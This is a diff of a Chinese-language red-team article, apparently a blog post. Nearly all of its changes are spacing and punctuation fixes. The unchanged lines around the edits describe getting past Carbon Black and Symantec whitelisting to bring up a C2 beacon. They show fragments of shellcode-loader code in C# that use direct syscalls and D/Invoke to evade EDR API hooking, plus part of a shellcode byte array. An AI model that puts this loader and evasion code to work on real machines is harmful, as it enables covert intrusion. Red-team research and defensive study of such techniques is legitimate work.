@@ -26,7 +26,7 @@ Application Whitelisting（应用程序白名单）是一种安全策略，只�
 
 直接执行 exe 被拦截，提示桌面进程 explorer.exe 运行未获批准的 exe 文件：
 
-> 应用程序白名单系统已识别并暂停了 explorer.exe 运行 fesfse.exe 的尝试，因为该文件未获批准。选择 “允许” 以运行此文件，或选择 “阻止” 以在此时停止运行此文件: 向下滚动查看诊断数据。
+> 应用程序白名单系统已识别并暂停了 explorer.exe 运行 fesfse.exe 的尝试，因为该文件未获批准。选择“允许”以运行此文件，或选择“阻止”以在此时停止运行此文件：向下滚动查看诊断数据。
 
 [![](assets/1709530577-fa8417715434376f3fe49b4e51593601.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301225836-2e60055e-d7dc-1.png)
 
@@ -62,7 +62,7 @@ c:\windows\system32\rundll32.exe c:\windows\system32\url.dll,FileProtocolHandler
 
 ### 0x05 使用白加黑调用 dll
 
-由于目录不可修改不可重命名，无权限替换或覆盖目标 dll ，UAC 机制拦截后要求输入密码：
+由于目录不可修改不可重命名，无权限替换或覆盖目标 dll，UAC 机制拦截后要求输入密码：
 
 [![](assets/1709530577-e9cb7da4c26d36c82c7bc4586e8693ba.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301230255-c8f65e88-d7dc-1.png)
 
@@ -131,11 +131,11 @@ namespace Math
 
 既然执行 Program.dll 并没有被拦截，那只需要将一个 ShellcodeLoader 编译成 dll 再通过 `Reflection.Assembly` 方式加载即可上线 C2
 
-这里同时为了绕过 EDR 对于Windows API 的 hook，使用 SysCall 方式的 ShellcodeLoader 进行尝试：
+这里同时为了绕过 EDR 对于 Windows API 的 hook，使用 SysCall 方式的 ShellcodeLoader 进行尝试：
 
 > [https://github.com/Kara-4search/SysCall\_ShellcodeLoad\_Csharp](https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp)
 
-首先生成 C# 格式的 shellcode，硬编码到 buf1数组：
+首先生成 C# 格式的 shellcode，硬编码到 buf1 数组：
 
 ```plain
 // 存放 shellcode
@@ -164,7 +164,7 @@ byte[] buf1 = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
 
 [![](assets/1709530577-703c5e5b1843b75f37b8746d3ffba41e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301230941-badaf04c-d7dd-1.png)
 
-更换使用 D/Invoke 方式的C# ShellcodeLoader 同样可以 Bypass 执行。
+更换使用 D/Invoke 方式的 C# ShellcodeLoader 同样可以 Bypass 执行。
 
 至此通过 PowerShell 反射加载 C# dll 执行恶意 shellcode 完成了绕过 Carbonblack 和 Symantec 组合极端策略限制下上线 C2。
 
@@ -176,24 +176,24 @@ byte[] buf1 = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
 
 **1\. 执行上下文和识别机制**
 
--   **PowerShell 调用**：当使用 PowerShell 直接调用或执行 `.dll` 文件时，该操作通常会被EDR（如Carbon Black）以及杀毒软件作为一个可疑行为进行监控和识别。这是因为恶意软件经常利用 PowerShell 来执行和加载恶意代码。
+-   **PowerShell 调用**：当使用 PowerShell 直接调用或执行 `.dll` 文件时，该操作通常会被 EDR（如 Carbon Black）以及杀毒软件作为一个可疑行为进行监控和识别。这是因为恶意软件经常利用 PowerShell 来执行和加载恶意代码。
 -   **Reflection Assembly 加载**：使用 `.NET` 的 `System.Reflection.Assembly` 类来加载和执行 `.dll` 文件，这种方式更多地被视为正常的程序运行行为，尤其是在开发和运行基于 `.NET` 框架的合法应用程序时。
 
 **2\. 安全策略和配置**
 
--   **安全策略差异**：Application Whitelisting 系统的配置可能专门针对通过命令行工具（如PowerShell）启动的可疑活动进行了优化，而对于在高级语言环境（如 `.NET` 应用程序）内部发生的动态加载行为的检测可能较为宽松。
+-   **安全策略差异**：Application Whitelisting 系统的配置可能专门针对通过命令行工具（如 PowerShell）启动的可疑活动进行了优化，而对于在高级语言环境（如 `.NET` 应用程序）内部发生的动态加载行为的检测可能较为宽松。
 -   **应用程序信任级别**：在某些情况下，基于`.NET` 的应用程序可能被视为更可信的程序，特别是如果应用程序是由企业内部开发或由受信任的第三方提供。因此，这些应用程序执行的动态库加载可能不会受到相同程度的审查。
 
 ### SysCall\_ShellcodeLoad 方式
 
 此方式主要依赖 `Auto_NativeCode.cs` 和 `Program.cs`
 
--   在 `Auto_NativeCode.cs` 中，关键代码涉及通过直接系统调用（Syscall）来绕过API hooking，并动态执行shellcode。首先，通过获取系统调用号（Syscall ID），然后构造并执行对应的汇编代码来完成这一过程。
--   `Program.cs` 中的关键代码演示了如何使用 `Auto_NativeCode.cs` 中定义的方法来分配内存、写入shellcode，并通过创建新线程来执行shellcode。
+-   在 `Auto_NativeCode.cs` 中，关键代码涉及通过直接系统调用（Syscall）来绕过 API hooking，并动态执行 shellcode。首先，通过获取系统调用号（Syscall ID），然后构造并执行对应的汇编代码来完成这一过程。
+-   `Program.cs` 中的关键代码演示了如何使用 `Auto_NativeCode.cs` 中定义的方法来分配内存、写入 shellcode，并通过创建新线程来执行 shellcode。
 
 #### 获取系统调用号
 
-通过 `GetProcAddress` 和 `ReadProcessMemory` 动态获取了指定系统函数（如`NtAllocateVirtualMemory`）的系统调用号（Syscall ID）。这是绕过API hooking的关键一步，因为它不直接调用API，而是通过其Syscall ID来执行：
+通过 `GetProcAddress` 和 `ReadProcessMemory` 动态获取了指定系统函数（如`NtAllocateVirtualMemory`）的系统调用号（Syscall ID）。这是绕过 API hooking 的关键一步，因为它不直接调用 API，而是通过其 Syscall ID 来执行：
 
 ```plain
 public static uint GetSyscallID(string SysFunName)
@@ -242,9 +242,9 @@ unsafe
 }
 ```
 
-#### 分配内存并写入shellcode
+#### 分配内存并写入 shellcode
 
-`Program.cs` 首先定义了一个名为 `buf1` 的字节数组用来存放硬编码的 shellcode 用于展示如何执行任意代码，接着通过调用 `Auto_NativeCode.NtAllocateVirtualMemory` 系统调用分配内存，然后使用 `Marshal.Copy` 将shellcode复制到分配的内存中：
+`Program.cs` 首先定义了一个名为 `buf1` 的字节数组用来存放硬编码的 shellcode 用于展示如何执行任意代码，接着通过调用 `Auto_NativeCode.NtAllocateVirtualMemory` 系统调用分配内存，然后使用 `Marshal.Copy` 将 shellcode 复制到分配的内存中：
 
 ```plain
 uint ntAllocResult = Auto_NativeCode.NtAllocateVirtualMemory(
@@ -258,9 +258,9 @@ uint ntAllocResult = Auto_NativeCode.NtAllocateVirtualMemory(
 Marshal.Copy(buf1, 0, (IntPtr)(pMemoryAllocation), buf1.Length);
 ```
 
-#### 创建线程执行shellcode
+#### 创建线程执行 shellcode
 
-通过调用 `Auto_NativeCode.NtCreateThreadEx` 方法创建一个新线程来执行shellcode。这个方法构造了另一个用于调用 `NtCreateThreadEx` 的shellcode，并通过该shellcode创建一个线程来执行之前复制到分配内存的shellcode：
+通过调用 `Auto_NativeCode.NtCreateThreadEx` 方法创建一个新线程来执行 shellcode。这个方法构造了另一个用于调用 `NtCreateThreadEx` 的 shellcode，并通过该 shellcode 创建一个线程来执行之前复制到分配内存的 shellcode：
 
 ```plain
 uint hThreadResult = Auto_NativeCode.NtCreateThreadEx(   
@@ -282,8 +282,8 @@ uint hThreadResult = Auto_NativeCode.NtCreateThreadEx(
 
 此方式主要依赖 `DInvokeFunctions.cs` 和 `Program.cs`
 
--   在 `DInvokeFunctions.cs` 中，定义了多个方法来实现 D/Invoke，即直接调用内存中的函数而不是通过常规的API调用。这主要用于绕过防护机制，如 API hooking。
--   在 `Program.cs` 中，展示了如何使用 `DInvokeFunctions` 类中的方法来动态调用 `kernel32.dll` 的 `VirtualAlloc`, `CreateThread`, 和 `WaitForSingleObject` 函数，以在内存中分配空间、执行shellcode，并等待线程结束。
+-   在 `DInvokeFunctions.cs` 中，定义了多个方法来实现 D/Invoke，即直接调用内存中的函数而不是通过常规的 API 调用。这主要用于绕过防护机制，如 API hooking。
+-   在 `Program.cs` 中，展示了如何使用 `DInvokeFunctions` 类中的方法来动态调用 `kernel32.dll` 的 `VirtualAlloc`, `CreateThread`, 和 `WaitForSingleObject` 函数，以在内存中分配空间、执行 shellcode，并等待线程结束。
 
 #### 获取已加载模块地址
 
@@ -330,9 +330,9 @@ DELEGATES.VirtualAllocRx VirtualAllocRx = Marshal.GetDelegateForFunctionPointer(
 IntPtr rMemAddress = VirtualAllocRx(0, (uint)codepent.Length, 0x1000 | 0x2000, 0x40);
 ```
 
-#### 将shellcode复制到分配的内存并创建线程执行
+#### 将 shellcode 复制到分配的内存并创建线程执行
 
-使用 `Marshal.Copy` 将 shellcode 复制到之前通过 `VirtualAlloc` 分配的内存中。然后，通过D/Invoke调用 `CreateThread` 函数创建一个新线程，线程的入口点是 shellcode 的内存地址，从指定内存地址开始执行 shellcode。
+使用 `Marshal.Copy` 将 shellcode 复制到之前通过 `VirtualAlloc` 分配的内存中。然后，通过 D/Invoke 调用 `CreateThread` 函数创建一个新线程，线程的入口点是 shellcode 的内存地址，从指定内存地址开始执行 shellcode。
 
 ```plain
 Marshal.Copy(codepent, 0, (IntPtr)(rMemAddress), codepent.Length);
@@ -351,28 +351,28 @@ DELEGATES.WaitForSingleObjectRx WaitForSingleObjectRx = Marshal.GetDelegateForFu
 WaitForSingleObjectRx(hThread, 0xFFFFFFFF);
 ```
 
-> 在D/Invoke场景中，委托是一种允许程序动态调用任意函数地址的机制。通过这种方式，可以在不直接链接到函数的情况下执行其代码，增加了代码的灵活性和隐蔽性，可以看到 D\\Invoke ShellcodeLoader 的 API 调用未被 API 监控程序捕获：
+> 在 D/Invoke 场景中，委托是一种允许程序动态调用任意函数地址的机制。通过这种方式，可以在不直接链接到函数的情况下执行其代码，增加了代码的灵活性和隐蔽性，可以看到 D\\Invoke ShellcodeLoader 的 API 调用未被 API 监控程序捕获：
 
 [![](assets/1709530577-4fe6d47caea303a870eb19bdd79b5037.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240301231042-deccef46-d7dd-1.png)
 
 ### 两种方式的区别
 
-1.  **调用层次不同**：D/Invoke 操作于API层之上，通过动态解析和调用Win32 API函数；而 SysCall 直接直接与操作系统内核通信，绕过了Win32 API层。
-2.  **检测难度**：由于Syscall直接调用不通过常规API层，它更难被基于 API 监控的安全产品检测到。D/Invoke虽然也能绕过一定的监控，但相比之下，直接使用系统调用的方式更隐蔽。
-3.  **实现复杂度**：Syscall 直接调用需要更深入的系统内核知识，包括系统调用的具体实现和寄存器的正确设置。D/Invoke 虽然也需要理解PE结构和函数导出表，但比直接构造和执行系统调用更容易实现。
-4.  **应用场景**：两者都是为了绕过监控和安全检测，但Syscall直接调用更适用于需要极高隐蔽性的场景。D/Invoke则适用于需要动态调用多个API，且不希望或不能静态链接到这些API的场景。
+1.  **调用层次不同**：D/Invoke 操作于 API 层之上，通过动态解析和调用 Win32 API 函数；而 SysCall 直接直接与操作系统内核通信，绕过了 Win32 API 层。
+2.  **检测难度**：由于 Syscall 直接调用不通过常规 API 层，它更难被基于 API 监控的安全产品检测到。D/Invoke 虽然也能绕过一定的监控，但相比之下，直接使用系统调用的方式更隐蔽。
+3.  **实现复杂度**：Syscall 直接调用需要更深入的系统内核知识，包括系统调用的具体实现和寄存器的正确设置。D/Invoke 虽然也需要理解 PE 结构和函数导出表，但比直接构造和执行系统调用更容易实现。
+4.  **应用场景**：两者都是为了绕过监控和安全检测，但 Syscall 直接调用更适用于需要极高隐蔽性的场景。D/Invoke 则适用于需要动态调用多个 API，且不希望或不能静态链接到这些 API 的场景。
 
 ## 总结
 
-国内的主流杀毒软件以及 EDR 默认虽然都会拦截 PowerShell 脚本，但是对可执行文件的分析、行为检测、内存扫描等方面可以存在一定的缺陷；与此同时企业通过EDR（Endpoint Detection and Response）策略设置禁止任意 `.exe`、`.com`、`.scr`、`.cpl` 类型的可执行程序运行，以及禁止执行 `PowerShell` 脚本和 `.bat` 等脚本文件，无疑可以显著提高网络安全防护水平，减少恶意软件和攻击者利用这些常见文件类型和脚本语言执行攻击的机会。
+国内的主流杀毒软件以及 EDR 默认虽然都会拦截 PowerShell 脚本，但是对可执行文件的分析、行为检测、内存扫描等方面可以存在一定的缺陷；与此同时企业通过 EDR（Endpoint Detection and Response）策略设置禁止任意 `.exe`、`.com`、`.scr`、`.cpl` 类型的可执行程序运行，以及禁止执行 `PowerShell` 脚本和 `.bat` 等脚本文件，无疑可以显著提高网络安全防护水平，减少恶意软件和攻击者利用这些常见文件类型和脚本语言执行攻击的机会。
 
 然而，这种方法虽然强化了安全防护，但也牺牲了用户的部分体验，并且不能保证绝对的安全。攻击者可能会采用其他技术和方法绕过这些限制，实施命令与控制（C&C）攻击，包括但不限于：
 
--   **利用合法的系统工具**：攻击者可能利用 Windows 中合法的系统工具执行恶意代码，例如 [LOLBAS](https://lolbas-project.github.io/)（Living Off The Land），这些工具通常不会被防病毒软件或EDR策略禁止，因为它们是操作系统的一部分；
--   **白加黑攻击**：攻击者可能使用白文件加载恶意的 dll 来进行 C&C 攻击；又或者通过文件无害化技术（如利用宏、OLE对象等）在文档文件中植入恶意代码。即便 `.exe`、`.com` 等直接可执行文件被禁止，通过诸如 Word 或 Excel 文档的宏脚本结合社工钓鱼攻击也能执行恶意代码；
--   **无文件攻击**：通过某些技术例如反射 DLL注入、CobaltStrike 的 Execute-Assembly 、Beacon Object File (BOF) ，攻击者可以直接在内存中执行恶意代码，绕过硬盘上的可执行文件限制的同时可以不拉起任何进程并绕过 API Hooking，这些攻击更难检测。
+-   **利用合法的系统工具**：攻击者可能利用 Windows 中合法的系统工具执行恶意代码，例如 [LOLBAS](https://lolbas-project.github.io/)（Living Off The Land），这些工具通常不会被防病毒软件或 EDR 策略禁止，因为它们是操作系统的一部分；
+-   **白加黑攻击**：攻击者可能使用白文件加载恶意的 dll 来进行 C&C 攻击；又或者通过文件无害化技术（如利用宏、OLE 对象等）在文档文件中植入恶意代码。即便 `.exe`、`.com` 等直接可执行文件被禁止，通过诸如 Word 或 Excel 文档的宏脚本结合社工钓鱼攻击也能执行恶意代码；
+-   **无文件攻击**：通过某些技术例如反射 DLL 注入、CobaltStrike 的 Execute-Assembly、Beacon Object File (BOF) ，攻击者可以直接在内存中执行恶意代码，绕过硬盘上的可执行文件限制的同时可以不拉起任何进程并绕过 API Hooking，这些攻击更难检测。
 
-企业防御复杂网络威胁，特别是面对高级持续性威胁（APT）和命令与控制（C&C）攻击时，需要采取多层次、全面的安全策略，包括但不限于EDR、防病毒软件、网络安全工具、安全意识培训、定期的安全审计和漏洞评估。通过这种综合性的安全策略，企业可以更有效地防御各种类型的威胁，包括复杂的C&C攻击。
+企业防御复杂网络威胁，特别是面对高级持续性威胁（APT）和命令与控制（C&C）攻击时，需要采取多层次、全面的安全策略，包括但不限于 EDR、防病毒软件、网络安全工具、安全意识培训、定期的安全审计和漏洞评估。通过这种综合性的安全策略，企业可以更有效地防御各种类型的威胁，包括复杂的 C&C 攻击。
 
 ## Reference
 
